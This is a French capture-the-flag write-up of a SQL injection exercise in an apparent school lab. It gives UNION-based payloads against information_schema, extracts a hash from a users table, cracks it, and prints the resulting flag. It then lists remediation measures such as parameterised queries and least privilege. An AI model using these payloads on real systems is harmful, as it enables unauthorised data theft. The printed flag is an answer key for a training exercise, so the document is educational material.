
---

# Exploitation de vulnérabilité SQL pour obtenir un flag

## Description de la faille

Une vulnérabilité SQL Injection permet d'extraire des données sensibles de la base de données. En exploitant cette faille, nous avons pu découvrir une table d'intérêt, obtenir des informations sur ses colonnes, et finalement extraire et transformer des données pour obtenir le flag.

## Étapes pour découvrir la faille

### 1. Initialiser l'injection SQL pour vérifier la vulnérabilité

En essayant la condition toujours vraie `1 OR 1=1`, nous obtenons :

```sql
1 OR 1=1; --
First name: Flag
Surname : GetThe
```

### 2. Lister toutes les tables de la base de données

En utilisant une requête UNION pour lister les tables, nous trouvons :

```sql
1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables; --
First name: 1
Surname : users
```

La table `users` semble intéressante, nous allons nous concentrer dessus.

### 3. Lister toutes les colonnes de la table `users`

Nous listons les colonnes de la table `users` avec les requêtes suivantes , et on cherche la table users la dedans:

```sql
1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; --
```

Les colonnes découvertes sont :

- `user_id`
- `first_name`
- `last_name`
- `town`
- `country`
- `planet`
- `Commentaire`
- `countersign`

### 4. Extraire les données des colonnes intéressantes

Nous allons essayer de voir ce qu'il y a dans chacune de ces colonnes. Après avoir vérifié plusieurs champs, nous trouvons des informations intéressantes dans les colonnes `Commentaire` et `countersign` :

```sql
1 AND 1=1 UNION SELECT Commentaire, countersign FROM users; --
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

### 5. Décrypter et transformer les données pour obtenir le flag

1. **Décrypter le mot de passe** :
   - `5ff9d0165b4f92b14994e5c685cdce28` correspond à `Fortytwo` en MD5.

2. **Convertir en minuscules** :
   - `Fortytwo` devient `fortytwo`.

3. **Calculer le hash SHA-256** :
   - `fortytwo` en SHA-256 donne `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`.

### Conclusion

En suivant ces étapes, nous avons pu exploiter une vulnérabilité SQL Injection pour extraire des données sensibles et finalement obtenir le flag.

## Flag

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

### Recommandations pour remédier à la vulnérabilité SQL Injection

1. **Utilisation de Requêtes Paramétrées (Préparées)**
   - **Description** : Les requêtes paramétrées permettent de séparer le code SQL des données utilisateur. Cela empêche les données utilisateur d'être interprétées comme des parties de la commande SQL.
   - **Pratique** : Configurez votre base de données et votre langage de programmation pour utiliser des requêtes préparées avec des paramètres. Cela garantit que les entrées utilisateur sont traitées uniquement comme des données, et non comme du code SQL.

2. **Utilisation des ORM (Object-Relational Mapping)**
   - **Description** : Les ORM sont des outils qui permettent de manipuler la base de données en utilisant des objets du langage de programmation plutôt que des commandes SQL directes.
   - **Pratique** : Utilisez un ORM pour gérer les interactions avec la base de données. Les ORM incluent des mécanismes pour échapper automatiquement les entrées utilisateur, réduisant ainsi le risque d'injection SQL.

3. **Validation et Échappement des Entrées Utilisateur**
   - **Description** : La validation des entrées consiste à vérifier que les données saisies par l'utilisateur sont conformes aux attentes (format, longueur, type, etc.). L'échappement consiste à transformer les caractères spéciaux en leur équivalent sécurisé.
   - **Pratique** : Mettez en place des validations rigoureuses pour toutes les entrées utilisateur à différents niveaux de votre application (frontend et backend). Utilisez des bibliothèques d'échappement adaptées à votre langage de programmation pour sécuriser les données avant de les utiliser dans des requêtes SQL.

4. **Limiter les Privilèges de la Base de Données**
   - **Description** : Restreindre les privilèges des comptes de base de données utilisés par l'application pour limiter l'impact potentiel d'une injection SQL.
   - **Pratique** : Configurez votre base de données pour que les comptes utilisés par l'application n'aient que les privilèges nécessaires (par exemple, l'accès en lecture seule pour les opérations de lecture). Utilisez des comptes distincts pour différentes parties de l'application avec des privilèges minimaux.

5. **Utilisation des Outils de Détection et de Prévention des Intrusions (IDS/IPS)**
   - **Description** : Les IDS/IPS sont des systèmes qui surveillent le trafic réseau et les activités de l'application pour détecter et prévenir les tentatives d'attaque.
   - **Pratique** : Implémentez des solutions IDS/IPS pour surveiller les requêtes SQL et détecter les modèles de comportement suspects ou les tentatives d'injection. Configurez des alertes pour être informé immédiatement en cas de détection d'une activité anormale.

6. **Tests de Sécurité et Audits Réguliers**
   - **Description** : Les tests de sécurité consistent à analyser et tester régulièrement votre application pour identifier et corriger les failles potentielles.
   - **Pratique** : Planifiez des audits de sécurité réguliers et des tests d'intrusion pour évaluer la robustesse de votre application contre les injections SQL et autres types de vulnérabilités. Utilisez des outils d'analyse statique et dynamique pour détecter les failles de sécurité dans votre code.

7. **Utilisation de Captchas**
   - **Description** : Les captchas permettent de différencier les utilisateurs humains des scripts automatisés, ce qui peut réduire le risque d'attaques automatisées.
   - **Pratique** : Intégrez des captchas dans les formulaires de votre application, en particulier ceux qui déclenchent des opérations critiques comme la connexion ou les modifications de compte.

8. **Formation et Sensibilisation des Développeurs**
   - **Description** : La sensibilisation des développeurs aux meilleures pratiques de sécurité est essentielle pour prévenir les vulnérabilités.
   - **Pratique** : Organisez des sessions de formation régulières pour les développeurs sur les meilleures pratiques de sécurité, les techniques d'évitement des injections SQL et l'utilisation correcte des outils et des bibliothèques de sécurité.

---
